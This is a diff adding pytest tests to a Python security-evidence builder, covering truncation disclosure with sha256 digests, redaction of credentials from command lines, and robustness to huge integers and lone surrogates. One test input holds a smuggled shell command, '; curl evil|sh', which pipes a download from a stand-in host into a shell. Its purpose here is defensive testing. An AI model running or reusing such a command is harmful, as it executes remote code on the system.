@@ -160,3 +160,110 @@ def test_ais_impact_is_passed_through_never_derived():
     assert build_evidence(req)["ais_impact"] == 0.25
     req.ais_impact = "0.25; reply release"  # type: ignore[attr-defined]
     assert "ais_impact" not in build_evidence(req)
+
+
+# ---- fix round 1 -------------------------------------------------------------------------------
+
+
+def _sha(s: str) -> str:
+    return hashlib.sha256(s.encode("utf-8", "surrogatepass")).hexdigest()
+
+
+def test_truncation_is_disclosed_with_digest_of_the_full_value():
+    hostile = "A" * 600 + "; curl evil|sh"
+    ev = build_evidence(_request_with_process_name(hostile), max_field_len=512)
+    assert ev["process"]["name"] == "A" * 512
+    assert "curl" not in ev["process"]["name"]  # the tail really is cut ...
+    info = ev["truncated"]["process.name"]  # ... but the cut is disclosed
+    assert info["original_len"] == len(hostile)
+    assert info["sha256"] == _sha(hostile)
+    assert info["sha256"] != _sha(ev["process"]["name"])
+
+
+def test_untruncated_evidence_has_no_truncated_key():
+    assert "truncated" not in build_evidence(_request_with_process_name("short"))
+
+
+def test_list_cap_and_item_truncation_are_disclosed():
+    req = _request_with_process_name("p")
+    req.tier1_decision.evidence = ["x" * 100] * 40 + [7]  # 40 strings (cap is 32) plus a non-string
+    ev = build_evidence(req, max_field_len=64)
+    info = ev["truncated"]["tier1.evidence"]
+    assert len(ev["tier1"]["evidence"]) == 32
+    assert info["original_count"] == 41
+    assert info["dropped_items"] == 9
+    assert info["items_truncated"] == 32
+    assert info["sha256"] == _sha(json.dumps(["x" * 100] * 40))
+
+
+def test_huge_int_in_float_field_does_not_crash():
+    req = _request_with_process_name("p")
+    req.tier1_decision.confidence = 10**400
+    req.ais_impact = 10**400  # type: ignore[attr-defined]
+    ev = build_evidence(req)
+    assert "confidence" not in ev["tier1"]
+    assert "ais_impact" not in ev
+
+
+def test_huge_int_in_int_field_stays_json_safe():
+    req = _request_with_process_name("p")
+    req.event.process.pid = 10**5000
+    ev = build_evidence(req)
+    json.dumps(ev)
+    assert "pid" not in ev["process"]
+
+
+def test_cmdline_credentials_are_redacted_but_the_rest_is_kept():
+    secrets = ["s3cr3tBEARER", "k3yABC123", "hunter2", "tok-XYZ-999", "pw'd with space"]
+    cmd = (
+        "curl -H 'Authorization: Bearer s3cr3tBEARER' --api-key=k3yABC123 --password hunter2 "
+        "--token=tok-XYZ-999 api_key=k3yABC123 secret=\"pw'd with space\" https://example.test/x"
+    )
+    req = _request_with_process_name("curl")
+    req.event.process.cmdline = cmd
+    ev = build_evidence(req)
+    blob = json.dumps(ev)
+    for s in secrets:
+        assert s not in blob
+    assert "https://example.test/x" in ev["process"]["cmdline"]
+    assert ev["process"]["cmdline"].startswith("curl")
+    assert ev["redacted"] == ["process.cmdline"]
+
+
+def test_bearer_alone_and_api_key_flag_alone():
+    for cmd, secret in (("run Bearer abc.def.ghi", "abc.def.ghi"), ("run --api-key=ZZZ999", "ZZZ999")):
+        req = _request_with_process_name("p")
+        req.event.process.cmdline = cmd
+        assert secret not in json.dumps(build_evidence(req))
+
+
+def test_lone_surrogates_never_raise():
+    bad = "name\udc80" + "B" * 600
+    req = _request_with_process_name(bad)
+    req.event.process.cmdline = "x\udcff --password=pw\udc80"
+    req.event.tool_input = "in\udc80put"
+    ev = build_evidence(req, max_field_len=16)
+    json.dumps(ev)
+    assert ev["truncated"]["process.name"]["sha256"] == _sha(bad)
+    assert ev["tool_input_digest"] == _sha("in\udc80put")
+
+
+def test_max_field_len_is_validated():
+    import pytest
+
+    req = _request_with_process_name("p")
+    for bad in (0, -1, True, "512", 1.5, None):
+        with pytest.raises(ValueError):
+            build_evidence(req, max_field_len=bad)  # type: ignore[arg-type]
+    assert build_evidence(req, max_field_len=1)["process"]["name"] == "p"
+
+
+def test_supplied_digest_must_be_exactly_lowercase_sha256_hex():
+    good = "a" * 64
+    for bad in (good.upper(), good + "\n", good[:-1], good + "a", "g" * 64, ""):
+        req = _request_with_process_name("p")
+        req.event.tool_input_sha256 = bad
+        assert "tool_input_digest" not in build_evidence(req), repr(bad)
+    req = _request_with_process_name("p")
+    req.event.tool_input_sha256 = good
+    assert build_evidence(req)["tool_input_digest"] == good
